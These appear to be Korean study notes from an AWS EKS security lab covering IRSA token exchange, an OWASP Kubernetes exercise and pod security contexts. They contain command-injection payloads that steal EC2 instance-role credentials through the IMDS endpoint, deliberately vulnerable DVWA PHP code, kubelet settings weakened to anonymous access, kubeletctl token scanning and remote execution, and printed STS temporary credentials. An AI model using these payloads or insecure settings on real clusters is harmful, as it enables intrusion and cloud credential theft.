eksctl create iamserviceaccount \
  --name my-sa \
  --namespace default \
  --cluster $CLUSTER_NAME \
  --approve \
  --attach-policy-arn $(aws iam list-policies --query 'Policies[?PolicyName==`AmazonS3ReadOnlyAccess`].Arn' --output text)

# 확인 >> 웹 관리 콘솔에서 CloudFormation Stack >> IAM Role 확인
NAMESPACE       NAME                            ROLE ARN
default         my-sa                           arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
kube-system     aws-load-balancer-controller    arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-kube-sy-Role1-PWWPESIC5H4U

# Inspecting the newly created Kubernetes Service Account, we can see the role we want it to assume in our pod.
kubectl get sa
kubectl describe sa my-sa
Name:                my-sa
Namespace:           default
Labels:              app.kubernetes.io/managed-by=eksctl
Annotations:         eks.amazonaws.com/role-arn: arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
Image pull secrets:  <none>
Mountable secrets:   <none>
Tokens:              <none>
Events:              <none>
```

**Now let’s see what happens when we use this new Service Account within a Kubernetes Pod**

```
# 파드3번 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: eks-iam-test3
spec:
  serviceAccountName: my-sa
  containers:
    - name: my-aws-cli
      image: amazon/aws-cli:latest
      command: ['sleep', '36000']
  restartPolicy: Never
EOF

# 해당 SA를 파드가 사용 시 mutatingwebhook으로 Env,Volume 추가함
kubectl get mutatingwebhookconfigurations pod-identity-webhook -o yaml | kubectl neat | yh

# 파드 생성 yaml에 없던 내용이 추가됨!!!!!
# Pod Identity Webhook은 mutating webhook을 통해 아래 Env 내용과 1개의 볼륨을 추가함
kubectl get pod eks-iam-test3
kubectl describe pod eks-iam-test3

Environment:
      AWS_STS_REGIONAL_ENDPOINTS:   regional
      AWS_DEFAULT_REGION:           ap-northeast-2
      AWS_REGION:                   ap-northeast-2
      AWS_ROLE_ARN:                 arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
      AWS_WEB_IDENTITY_TOKEN_FILE:  /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# 파드에서 aws cli 사용 확인
eksctl get iamserviceaccount --cluster $CLUSTER_NAME
kubectl exec -it eks-iam-test3 -- aws sts get-caller-identity --query Arn
"arn:aws:sts::485702506058:assumed-role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452/botocore-session-1685816069"
```

If we inspect the Pod using Kubectl and jq, we can see there are now two volumes mounted into our Pod.

```
# 파드에 볼륨 마운트 2개 확인
kubectl get pod eks-iam-test3 -o json | jq -r '.spec.containers | .[].volumeMounts'
[
  {
    "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
    "name": "kube-api-access-zdpzp",
    "readOnly": true
  },
  {
    "mountPath": "/var/run/secrets/eks.amazonaws.com/serviceaccount",
    "name": "aws-iam-token",
    "readOnly": true
  }
]

kubectl get pod eks-iam-test3 -o json | jq -r '.spec.volumes[] | select(.name=="aws-iam-token")'
{
  "name": "aws-iam-token",
  "projected": {
    "defaultMode": 420,
    "sources": [
      {
        "serviceAccountToken": {
          "audience": "sts.amazonaws.com",
          "expirationSeconds": 86400,
          "path": "token"
        }
      }
    ]
  }
}

# api 리소스 확인
kubectl api-resources |grep hook
mutatingwebhookconfigurations                  admissionregistration.k8s.io/v1        false        MutatingWebhookConfiguration
validatingwebhookconfigurations                admissionregistration.k8s.io/v1        false        ValidatingWebhookConfiguration

kubectl get MutatingWebhookConfiguration

NAME                              WEBHOOKS   AGE
aws-load-balancer-webhook         3          70m
kube-prometheus-stack-admission   1          68m
pod-identity-webhook              1          100m
vpc-resource-mutating-webhook     1          100m

# pod-identity-webhook 확인
kubectl describe MutatingWebhookConfiguration pod-identity-webhook 
kubectl get MutatingWebhookConfiguration pod-identity-webhook -o yaml | yh=
```

If we exec into the running Pod and inspect this token, we can see that it looks slightly different from the previous SA Token.

```
# AWS_WEB_IDENTITY_TOKEN_FILE 확인
IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
echo $IAM_TOKEN
```

JWT 웹 확인 

![image](https://github.com/jiwonYun9332/AWES-1/blob/ebdfba7dccbc308536be0006ea4a6f57990bccbc/Study/images/114_image.jpg)

```
# env 변수 확인
[
  {
    "name": "AWS_STS_REGIONAL_ENDPOINTS",
    "value": "regional"
  },
  {
    "name": "AWS_DEFAULT_REGION",
    "value": "ap-northeast-2"
  },
  {
    "name": "AWS_REGION",
    "value": "ap-northeast-2"
  },
  {
    "name": "AWS_ROLE_ARN",
    "value": "arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452"
  },
  {
    "name": "AWS_WEB_IDENTITY_TOKEN_FILE",
    "value": "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
  }
]
```

Now that our workload has a token it can use to attempt to authenticate with IAM, the next part is getting AWS IAM to trust these tokens. AWS IAM supports federated identities using OIDC identity providers. This feature allows IAM to authenticate AWS API calls with supported identity providers after receiving a valid OIDC JWT. This token can then be passed to AWS STS AssumeRoleWithWebIdentity API operation to get temporary IAM credentials.

The OIDC JWT token we have in our Kubernetes workload is cryptographically signed, and IAM should trust and validate these tokens before the AWS STS AssumeRoleWithWebIdentity API operation can send the temporary credentials. As part of the Service Account Issuer Discovery feature of Kubernetes, EKS is hosting a public OpenID provider configuration document (Discovery endpoint) and the public keys to validate the token signature (JSON Web Key Sets – JWKS) at https://OIDC_PROVIDER_URL/.well-known/openid-configuration.

```
# Let’s take a look at this endpoint. We can use the aws eks describe-cluster command to get the OIDC Provider URL.
IDP=$(aws eks describe-cluster --name myeks --query cluster.identity.oidc.issuer --output text)

# Reach the Discovery Endpoint
curl -s $IDP/.well-known/openid-configuration | jq -r '.'

# In the above output, you can see the jwks (JSON Web Key set) field, which contains the set of keys containing the public keys used to verify JWT (JSON Web Token). 
# Refer to the documentation to get details about the JWKS properties.
curl -s $IDP/keys | jq -r '.'
```
![image](https://github.com/jiwonYun9332/AWES-1/blob/4c4d3d0374e1e758034322079d56f7f9cdf900b1/Study/images/115_image.jpg)

IRSA를 가장 취약하게 사용하는 방법

```
# AWS_WEB_IDENTITY_TOKEN_FILE 토큰 값 변수 지정
IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
echo $IAM_TOKEN

# ROLE ARN 확인 후 변수 직접 지정
eksctl get iamserviceaccount --cluster $CLUSTER_NAME
ROLE_ARN=<각자 자신의 ROLE ARN>

# assume-role-with-web-identity STS 임시자격증명 발급 요청
aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --role-session-name mykey --web-identity-token $IAM_TOKEN | jq
{
  "Credentials": {
    "AccessKeyId": "ASIAXCFRACZFIKRGFY7S",
    "SecretAccessKey": "s8Z6AFtrNoKdRXgGyqAD4L2XRdVnaYvG0MfDrzco",
    "SessionToken": "IQoJb3JpZ2luX2VjELv//////////wEaDmFwLW5vcnRoZWFzdC0yIkgwRgIhAL0qZa+EOvb3978UoQ7+NjRO0GFmvnI5Be+mWrkIbdbDAiEAiFBbZhU2FPUyvahSY8RbS+QdtAXFSFzFnD+PLxPb7AUq+QQI9P//////////ARAAGgw0ODU3MDI1MDYwNTgiDDqhrQWZYvPxsiROEyrNBDLHA2fdiUjxmcYPifal/REzWjIDOoyr1Oc92sEn7+tuIDLnVqVtJ7Y7vLBwe8xR8zmoqL2zM2Hf/20xqSXyPOx8vvn+LV3+r1MXy8e+QxbKSBfAoFBerbPoiwv04qE+0z9IKbosreSBnB9m+eYz20rhkk+JaToRsokuHqwTDpQGbawgQJQKPW6PYvktbYh1aZlEjaHLzfpY9Pyxjjv2E4PPz2fSX02PkvBcew3pLtJsJUGgCqufrKr10bUPOY/nqfVeyQ5Y0i/725Jq5pa7+OkV9Ffe/ARYM8vV46BD2VEJ9vYu4dy5Y56p5QsLhMqu30YFwCGovDYbys0cX8RYJzJxzHfd244rHcjNuBA2EaX8EiIYqCbXTgk5fRamqH1USRokX9p95LMXh3qWq2CvqX8/X3/tkfl+HC6iIQ3+Sb+XzsB+iB6CvT0BSzJZDTynV/O7vedARUmjCPLPAHUTqIMgK9w8goGiBJ2uXFjMr3Ha+3nNHO+7sSiXaCvDXJTPhxYITq0aGTPkD00GxUdKZo9LWbmz5G22N9/fi0GGP8NMDhn0/mZpLZF79Fckcx6mQqX9wKYLyck/DMhCDUT4xtLf7MuPFoZNxstHjttQ9QxKPE3e9JFKl6fKsmnoWm7qPdnN90VEAqBYbYubn0WQCjVGn1ZUbltzomACUIFH0lIrD972IkE810Gb/EOk8mYIUhYSEPfL0FVYa495pFppq4JRibBwj12zaEeX+PbgdmpYA3SPesMHxBvqk4yRZHRUqz2WmvEHR97htGXXd/Mw75PuowY6mQFrh+WuPmjU1pESoLaivbbG76P3jUfk/xLdWfTgqbwi5IYaJERf31ZnOAEnUfvQkdVJCnUcDcCfoRpJB2PUZPdCVA04NZq6o4WPl62SkZUOZLuUWYQPJAWylpp3d9okUr0B96s3HkR/A5w2RDVOYtfXg/izTcqSaUH451Cmp/ukIkDS/mAb7IOzPxoKTdJzWpvE0Zunti+aBmk=",
    "Expiration": "2023-06-03T19:43:59+00:00"
  },
  "SubjectFromWebIdentityToken": "system:serviceaccount:default:my-sa",
  "AssumedRoleUser": {
    "AssumedRoleId": "AROAXCFRACZFMAZG4WLJ3:mykey",
    "Arn": "arn:aws:sts::485702506058:assumed-role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452/mykey"
  },
  "Provider": "arn:aws:iam::485702506058:oidc-provider/oidc.eks.ap-northeast-2.amazonaws.com/id/D920C4F8BAFB246BCAA2FF943951E241",
  "Audience": "sts.amazonaws.com"
}
```

실습 확인 후 파드 삭제

```
kubectl delete pod eks-iam-test3
```

### OWASP Kubernetes Top Ten

악성코드분석님 : EKS pod가 IMDS API를 악용하는 시나리오

mysql 배포

```
cat <<EOT > mysql.yaml
apiVersion: v1
kind: Secret
metadata:
  name: dvwa-secrets
type: Opaque
data:
  # s3r00tpa55
  ROOT_PASSWORD: czNyMDB0cGE1NQ==
  # dvwa
  DVWA_USERNAME: ZHZ3YQ==
  # p@ssword
  DVWA_PASSWORD: cEBzc3dvcmQ=
  # dvwa
  DVWA_DATABASE: ZHZ3YQ==
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa-mysql-service
spec:
  selector:
    app: dvwa-mysql
    tier: backend
  ports:
    - protocol: TCP
      port: 3306
      targetPort: 3306
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa-mysql
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa-mysql
      tier: backend
  template:
    metadata:
      labels:
        app: dvwa-mysql
        tier: backend
    spec:
      containers:
        - name: mysql
          image: mariadb:10.1
          resources:
            requests:
              cpu: "0.3"
              memory: 256Mi
            limits:
              cpu: "0.3"
              memory: 256Mi
          ports:
            - containerPort: 3306
          env:
            - name: MYSQL_ROOT_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: ROOT_PASSWORD
            - name: MYSQL_USER
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_USERNAME
            - name: MYSQL_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_PASSWORD
            - name: MYSQL_DATABASE
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_DATABASE
EOT
kubectl apply -f mysql.yaml
```

dvwa 배포

```
cat <<EOT > dvwa.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: dvwa-config
data:
  RECAPTCHA_PRIV_KEY: ""
  RECAPTCHA_PUB_KEY: ""
  SECURITY_LEVEL: "low"
  PHPIDS_ENABLED: "0"
  PHPIDS_VERBOSE: "1"
  PHP_DISPLAY_ERRORS: "1"
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa-web-service
spec:
  selector:
    app: dvwa-web
  type: ClusterIP
  ports:
    - protocol: TCP
      port: 80
      targetPort: 80
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa-web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa-web
  template:
    metadata:
      labels:
        app: dvwa-web
    spec:
      containers:
        - name: dvwa
          image: cytopia/dvwa:php-8.1
          ports:
            - containerPort: 80
          resources:
            requests:
              cpu: "0.3"
              memory: 256Mi
            limits:
              cpu: "0.3"
              memory: 256Mi
          env:
            - name: RECAPTCHA_PRIV_KEY
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: RECAPTCHA_PRIV_KEY
            - name: RECAPTCHA_PUB_KEY
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: RECAPTCHA_PUB_KEY
            - name: SECURITY_LEVEL
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: SECURITY_LEVEL
            - name: PHPIDS_ENABLED
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: PHPIDS_ENABLED
            - name: PHPIDS_VERBOSE
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: PHPIDS_VERBOSE
            - name: PHP_DISPLAY_ERRORS
              valueFrom:
                configMapKeyRef:
                  name: dvwa-config
                  key: PHP_DISPLAY_ERRORS
            - name: MYSQL_HOSTNAME
              value: dvwa-mysql-service
            - name: MYSQL_DATABASE
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_DATABASE
            - name: MYSQL_USERNAME
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_USERNAME
            - name: MYSQL_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: dvwa-secrets
                  key: DVWA_PASSWORD
EOT
kubectl apply -f dvwa.yaml
```

ingress 배포
```
cat <<EOT > dvwa-ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN
    alb.ingress.kubernetes.io/group.name: study
    alb.ingress.kubernetes.io/listen-ports: '[{"HTTPS":443}, {"HTTP":80}]'
    alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb
    alb.ingress.kubernetes.io/scheme: internet-facing
    alb.ingress.kubernetes.io/ssl-redirect: "443"
    alb.ingress.kubernetes.io/success-codes: 200-399
    alb.ingress.kubernetes.io/target-type: ip
  name: ingress-dvwa
spec:
  ingressClassName: alb
  rules:
  - host: dvwa.$MyDomain
    http:
      paths:
      - backend:
          service:
            name: dvwa-web-service
            port:
              number: 80
        path: /
        pathType: Prefix
EOT
kubectl apply -f dvwa-ingress.yaml
echo -e "DVWA Web https://dvwa.$MyDomain"
```

웹 접속 admin / password → DB 구성을 위해 클릭 (재로그인) ⇒ admin / password

Command Injection 메뉴 클릭

```
# 명령 실행 가능 확인
8.8.8.8 ; echo ; hostname
8.8.8.8 ; echo ; whoami

# IMDSv2 토큰 복사해두기
8.8.8.8 ; curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==

# EC2 Instance Profile (IAM Role) 이름 확인
8.8.8.8 ; curl -s -H "X-aws-ec2-metadata-token: AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==" –v http://169.254.169.254/latest/meta-data/iam/security-credentials/
eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1

# EC2 Instance Profile (IAM Role) 자격증명탈취 
8.8.8.8 ; curl -s -H "X-aws-ec2-metadata-token: AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==" –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-RIQSTAN95G8X
```

![image](https://github.com/jiwonYun9332/AWES-1/blob/ae855079ea07d313d39298ceda96efd567ba0e7f/Study/images/116_image.jpg)

![image](https://github.com/jiwonYun9332/AWES-1/blob/ae855079ea07d313d39298ceda96efd567ba0e7f/Study/images/117_image.jpg)

Low Command Injection Source

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

Medium Command Injection Source

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

Kubelet 미흡한 인증/인가 설정 시 위험 + kubeletct 툴

```
# 노드의 kubelet API 인증과 인가 관련 정보 확인
ssh ec2-user@$N1 cat /etc/kubernetes/kubelet/kubelet-config.json | jq
ssh ec2-user@$N1 cat /var/lib/kubelet/kubeconfig | yh

# 노드의 kubelet 사용 포트 확인 
ssh ec2-user@$N1 sudo ss -tnlp | grep kubelet
LISTEN 0      4096       127.0.0.1:10248      0.0.0.0:*    users:(("kubelet",pid=2940,fd=20))
LISTEN 0      4096               *:10250            *:*    users:(("kubelet",pid=2940,fd=21))

# 데모를 위해 awscli 파드 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: myawscli
spec:
  #serviceAccountName: my-sa
  containers:
    - name: my-aws-cli
      image: amazon/aws-cli:latest
      command: ['sleep', '36000']
  restartPolicy: Never
EOF

# 파드 사용
kubectl exec -it myawscli -- aws sts get-caller-identity --query Arn
kubectl exec -it myawscli -- aws s3 ls
kubectl exec -it myawscli -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
kubectl exec -it myawscli -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
```

[myeks-bastion-2] kubeletct 설치 및 사용

```
# 기존 kubeconfig 삭제
rm -rf ~/.kube

# 다운로드
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
kubeletctl version
kubeletctl help

# 노드1 IP 변수 지정
N1=<각자 자신의 노드1의 PrivateIP>
N1=192.168.1.153

# 노드1 IP로 Scan
kubeletctl scan --cidr $N1/32

# 노드1에 kubelet API 호출 시도
curl -k https://$N1:10250/pods; echo
Unauthorized
```

[myeks-bastion] → 노드1 접속 : kubelet-config.json 수정

```
# 노드1 접속
ssh ec2-user@$N1
-----------------------------
# 미흡한 인증/인가 설정으로 변경
vi /etc/kubernetes/kubelet/kubelet-config.json
...
"authentication": {
    "anonymous": {
      "enabled": true
...
  },
  "authorization": {
    "mode": "AlwaysAllow",
...

# kubelet restart
systemctl restart kubelet
systemctl status kubelet
```

[myeks-bastion-2] kubeletct 사용

```
# 파드 목록 확인
curl -s -k https://$N1:10250/pods | jq

# kubelet-config.json 설정 내용 확인
curl -k https://$N1:10250/configz | jq

# kubeletct 사용
# Return kubelet's configuration
kubeletctl -s $N1 configz | jq

# Get list of pods on the node
kubeletctl -s $N1 pods 

# Scans for nodes with opened kubelet API > Scans for for all the tokens in a given Node
kubeletctl -s $N1 scan token

# kubelet API로 명령 실행 : <네임스페이스> / <파드명> / <컨테이너명>
curl -k https://$N1:10250/run/default/myawscli/my-aws-cli -d "cmd=aws --version"

# Scans for nodes with opened kubelet API > remote code execution on their containers
kubeletctl -s $N1 scan rce

# Run commands inside a container
kubeletctl -s $N1 exec "/bin/bash" -n default -p myawscli -c my-aws-cli
--------------------------------
export
aws --version
aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
exit
--------------------------------

# Return resource usage metrics (such as container CPU, memory usage, etc.)
kubeletctl -s $N1 metrics
```

### 파드/컨테이너 보안 컨텍스트

컨테이너 보안 컨텍스트 SecurityContext

- 각 컨테이너에 대한 보안 설정 → 침해사고 발생 시 침해사고를 당한 권한을 최대한 축소하여 그 사고에 대한 확대를 방치

| 종류 | 개요 |
| --- | --- |
| privileged | 특수 권한을 가진 컨테이너로 실행 |
| capabilities | Capabilities 의 추가와 삭제 |
| allowPrivilegeEscalation | 컨테이너 실행 시 상위 프로세스보다 많은 권한을 부여할지 여부 |
| readOnlyRootFilesystem | root 파일 시스템을 읽기 전용으로 할지 여부 |
| runAsUser | 실행 사용자 |
| runAsGroup | 실행 그룹 |
| runAsNonRoot | root 에서 실행을 거부 |
| seLinuxOptions | SELinux 옵션 |

**컨테이너 보안 컨텍스트 확인 : kube-system 파드 내 컨테이너 대상**

```
kubectl get pod -n kube-system -o jsonpath={.items[*].spec.containers[*].securityContext} | jq
{
  "allowPrivilegeEscalation": false,
  "readOnlyRootFilesystem": true,
  "runAsNonRoot": true
}
...
```

readOnlyRootFilesystem : root 파일 시스템을 읽기 전용으로 사용

```
cat <<EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: rootfile-readonly
spec:
  containers:
  - name: netshoot
    image: nicolaka/netshoot
    command: ["tail"]
    args: ["-f", "/dev/null"]
    securityContext:
      readOnlyRootFilesystem: true
  terminationGracePeriodSeconds: 0
EOF

# 파일 생성 시도
kubectl exec -it rootfile-readonly -- touch /tmp/text.txt

# 기존 파일 수정 시도
kubectl exec -it rootfile-readonly -- cat /etc/hosts
kubectl exec -it rootfile-readonly -- sh -c "echo write > /etc/hosts"
kubectl exec -it rootfile-readonly -- cat /etc/hosts

# 특정 파티션, 파일의 ro/rw 확인
kubectl exec -it rootfile-readonly -- mount | grep hosts

kubectl exec -it rootfile-readonly -- mount | grep ro

## /proc, /dev, /sys/fs/cgroup, /etc/hosts, /proc/kcore, /proc/keys, /proc/timer_list
kubectl exec -it rootfile-readonly -- mount | grep rw

# 파드 상세 정보 확인
kubectl get pod rootfile-readonly -o jsonpath={.spec.containers[0].securityContext} | jq
```

- **파드** 보안 컨텍스트
    - 파드 레벨에서 보안 컨텍스트를 적용 : 파드에 포함된 모든 컨테이너가 영향을 받음
    - 파드와 컨테이너 정책 중복 시, 컨테이너 정책이 우선 적용됨

| 종류 | 개요 |
| --- | --- |
| runAsUser | 실행 사용자 |
| runAsGroup | 실행 그룹 |
| runAsNonRoot | root 에서 실행을 거부 |
| supplementalGroups | 프라이머리 GUI에 추가로 부여할 GID 목록을 지정 |
| fsGroup | 파일 시스템 그룹 지정 |
| systls | 덮어 쓸 커널 파라미터 지정 |
| seLinuxOptions | SELinux 옵션 지정 |

**컨테이너 보안 컨텍스트 확인 : kube-system 파드 내 컨테이너 대상**

```
kubectl get pod -n kube-system -o jsonpath={.items[*].spec.securityContext} | jq
```

**sysctl을 사용한 커널 파라미터 설정**

: 커널 파라미터 변경 적용을 위해서는 컨테이너에서도 설정 필요, 파드 수준 적용으로 컨테이너 간에 공유됨

커널 파라미터는 안전한 것(safe)과 안전하지 않은 것(unsafe)으로 분류된다

안전한 것 safe : 호스트의 커널과 적절하게 분리되어 있으며 다른 파드에 영향이 없는 것, 파드가 예상치 못한 리소스를 소비하지 않는 것

- `kernel.shm_rmid_forced`
- `net.ipv4.ip_local_port_range`
- `net.ipv4.tcp_syncookies`
- `net.ipv4.ping_group_range` (since Kubernetes 1.18),
- `net.ipv4.ip_unprivileged_port_start` (since Kubernetes 1.22).

안전하지 않은 것 unsafe : 사실상 대부분의 커널 파라미터 ⇒ 적용을 위해서는 kubelet 설정 필요

```
# Unsafe sysctls are enabled on a node-by-node basis with a flag of the kubelet
kubelet --allowed-unsafe-sysctls 'kernel.msg*,net.core.somaxconn' ...
```

unsafe 파라미터를 변경 시도

```
cat <<EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: unsafe
spec:
  securityContext:
    sysctls:
    - name: net.core.somaxconn
      value: "12345"
  containers:
    - name: centos-container
      image: centos:7
      command: ["/bin/sleep", "3600"]
  terminationGracePeriodSeconds: 0
EOF

kubectl events --for pod/unsafe
```




